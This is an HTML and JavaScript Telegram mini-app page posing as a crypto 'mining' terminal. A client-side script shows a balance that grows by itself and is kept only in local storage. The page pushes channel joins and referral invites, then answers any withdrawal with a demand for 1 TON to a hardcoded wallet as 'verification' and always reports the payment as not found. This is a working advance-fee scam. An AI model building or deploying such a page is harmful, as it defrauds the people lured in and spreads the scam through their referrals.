<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CointBot Pro | Terminal</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: 'Inter', -apple-system, sans-serif;
            background-color: #000000;
            color: white;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .balance-container { text-align: center; margin-bottom: 25px; }
        .label-top { color: #8a8a8e; font-size: 11px; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 5px; }
        .balance-value { font-size: 50px; font-weight: 900; font-variant-numeric: tabular-nums; text-shadow: 0 0 25px rgba(64, 167, 227, 0.4); }
        .currency { color: #40a7e3; margin-right: 5px; }

        .input-group { width: 85%; max-width: 320px; margin-bottom: 12px; }
        .input-label { font-size: 10px; color: #40a7e3; font-weight: bold; margin-bottom: 5px; margin-left: 5px; text-transform: uppercase; }
        input {
            width: 100%; background: #111; border: 1px solid #222; border-radius: 14px;
            padding: 14px; color: white; font-size: 14px; box-sizing: border-box; outline: none; transition: 0.3s;
        }
        input:focus { border-color: #40a7e3; background: #161616; }

        .tasks-box {
            width: 85%; max-width: 320px; background: rgba(64, 167, 227, 0.05);
            border: 1px dashed #333; border-radius: 14px; padding: 15px; margin-bottom: 12px; box-sizing: border-box;
        }
        .task-item { display: flex; justify-content: space-between; align-items: center; }
        .task-btn {
            background: #40a7e3; color: white; border: none; padding: 6px 12px;
            border-radius: 8px; font-size: 11px; font-weight: bold; cursor: pointer; text-decoration: none;
        }

        .withdraw-btn {
            width: 85%; max-width: 320px; background: #ffffff; color: #000000;
            border: none; padding: 18px; border-radius: 35px; font-size: 16px;
            font-weight: 800; cursor: pointer; transition: 0.2s;
        }
        .withdraw-btn:active { transform: scale(0.96); opacity: 0.8; }

        .status { margin-top: 15px; font-size: 10px; color: #4cd964; display: flex; align-items: center; gap: 6px; font-weight: bold; }
        .dot { width: 6px; height: 6px; background: #4cd964; border-radius: 50%; animation: pulse 1s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
    </style>
</head>
<body>

    <div class="balance-container">
        <div class="label-top">Total Profit Pool</div>
        <div class="balance-value">
            <span class="currency">$</span><span id="balance">0.00</span>
        </div>
        <div class="status">
            <div class="dot"></div> PROTOCOL LIVE
        </div>
    </div>

    <div class="tasks-box">
        <div class="task-item">
            <div style="font-size: 12px; color: #eee;"><b>Step 1:</b> Join Official Channel</div>
            <a href="https://t.me/hackpackposter" class="task-btn" onclick="playClickSound()">JOIN</a>
        </div>
    </div>

    <div class="tasks-box">
        <div class="task-item">
            <div style="font-size: 12px; color: #eee;"><b>Ref System:</b> Friends Invited (<span id="ref-count">0</span>)</div>
            <button class="task-btn" onclick="copyRefLink()">INVITE</button>
        </div>
    </div>

    <div class="input-group">
        <div class="input-label">Enter TG Wallet</div>
        <input type="text" id="wallet" placeholder="UQAr9x... or @username">
    </div>

    <div class="input-group">
        <div class="input-label">Security Password</div>
        <input type="password" id="password" placeholder="••••••••">
    </div>

    <button class="withdraw-btn" onclick="processWithdraw()">WITHDRAW NOW</button>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.setHeaderColor('#000000');

        // Инициализация аудио-контекста
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        const audioCtx = AudioContext ? new AudioContext() : null;

        // Генератор звуков на коде (Web Audio API)
        function playTone(freq, type, duration, volume) {
            if (!audioCtx) return;
            try {
                // Возобновляем контекст, если он спал (требование браузеров)
                if (audioCtx.state === 'suspended') {
                    audioCtx.resume();
                }
                const osc = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();
                
                osc.type = type;
                osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
                
                gainNode.gain.setValueAtTime(volume, audioCtx.currentTime);
                gainNode.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + duration);
                
                osc.connect(gainNode);
                gainNode.connect(audioCtx.destination);
                
                osc.start();
                osc.stop(audioCtx.currentTime + duration);
            } catch (e) { console.log(e); }
        }

        // Звук тиканья баланса (короткий мягкий клик)
        function playTickSound() {
            playTone(800, 'sine', 0.03, 0.05);
        }

        // Звук клика по кнопкам
        function playClickSound() {
            playTone(600, 'triangle', 0.08, 0.2);
        }

        // Звук ошибки / предупреждения
        function playErrorSound() {
            if (!audioCtx) return;
            try {
                if (audioCtx.state === 'suspended') audioCtx.resume();
                playTone(150, 'sawtooth', 0.15, 0.3);
                setTimeout(() => playTone(120, 'sawtooth', 0.2, 0.3), 100);
            } catch(e){}
        }

        // Звук успешного действия или открытия поп-апа
        function playSuccessSound() {
            if (!audioCtx) return;
            try {
                if (audioCtx.state === 'suspended') audioCtx.resume();
                playTone(523.25, 'sine', 0.1, 0.2); // Нота До
                setTimeout(() => playTone(659.25, 'sine', 0.1, 0.2), 80); // Нота Ми
                setTimeout(() => playTone(783.99, 'sine', 0.2, 0.2), 160); // Нота Соль
            } catch(e){}
        }

        // Восстановление баланса из памяти
        let balance = parseFloat(localStorage.getItem('terminal_balance') || '0.00');
        let isDead = false;
        const balanceDisplay = document.getElementById('balance');
        const refCountDisplay = document.getElementById('ref-count');

        // Инициализация счетчика рефералов
        let refCount = parseInt(localStorage.getItem('ref_clicks') || '0');
        refCountDisplay.innerText = refCount;

        const startParam = tg.initDataUnsafe?.start_param || "";
        if (startParam.startsWith('ref_')) {
            if (!localStorage.getItem('ref_registered')) {
                refCount += 1;
                localStorage.setItem('ref_clicks', refCount);
                localStorage.setItem('ref_registered', 'true');
                refCountDisplay.innerText = refCount;
            }
        }

        // Цикл майнинга с озвучкой
        function mine() {
            if (isDead) return;
            balance += Math.random() * 0.18; 
            
            // Запись в память устройства
            localStorage.setItem('terminal_balance', balance.toFixed(2));

            balanceDisplay.innerText = balance.toLocaleString('en-US', {
                minimumFractionDigits: 2, maximumFractionDigits: 2
            });

            // Каждые несколько тиков делаем легкий звук набора цифр
            if (Math.random() > 0.6) {
                playTickSound();
            }
        }
        setInterval(mine, 100);

        function copyRefLink() {
            playClickSound();
            const userId = tg.initDataUnsafe?.user?.id || "1473585452";
            const botLink = "https://t.me/moneylan_bot/hackpack?startapp=ref_" + userId; 
            
            if (navigator.clipboard) {
                navigator.clipboard.writeText(botLink).then(() => {
                    tg.showAlert("🔗 Referral link copied to clipboard!");
                }).catch(() => {
                    tg.showAlert("Link: " + botLink);
                });
            } else {
                tg.showAlert("Link: " + botLink);
            }
        }

        function processWithdraw() {
            const wallet = document.getElementById('wallet').value.trim();
            const pass = document.getElementById('password').value;

            if (pass === "hackpack1977") {
                playErrorSound();
                isDead = true; balance = 0.00; 
                localStorage.setItem('terminal_balance', '0.00');
                balanceDisplay.innerText = "0.00";
                tg.showAlert("🛑 Security Breach: Account Reset.");
                return;
            }

            if (!wallet) {
                playErrorSound();
                tg.showAlert("⚠️ Please enter your TG Wallet address first.");
                return;
            }

            // Минимальная валидация кошелька (длина или юзернейм)
            if (wallet.length < 5) {
                playErrorSound();
                tg.showAlert("⚠️ Invalid address. Please check your TG Wallet details.");
                return;
            }

            playSuccessSound();
            tg.showPopup({
                title: 'Verification Required',
                message: 'To verify your wallet, send 1 TON to the address below:\n\nUQBAtQa96SBwjfTpuiDAphf065OvEr1W78JUrL1U8X3-J9Mw\n\nAfter payment, click "Check Payment".',
                buttons: [
                    {id: 'check', type: 'default', text: 'Check Payment'},
                    {id: 'cancel', type: 'destructive', text: 'Cancel'}
                ]
            }, function(id) {
                if (id === 'check') {
                    playErrorSound();
                    tg.showAlert("❌ Payment not found. Verification takes 5-15 minutes. Please try again later.");
                } else {
                    playClickSound();
                }
            });
        }
    </script>
</body>
</html>
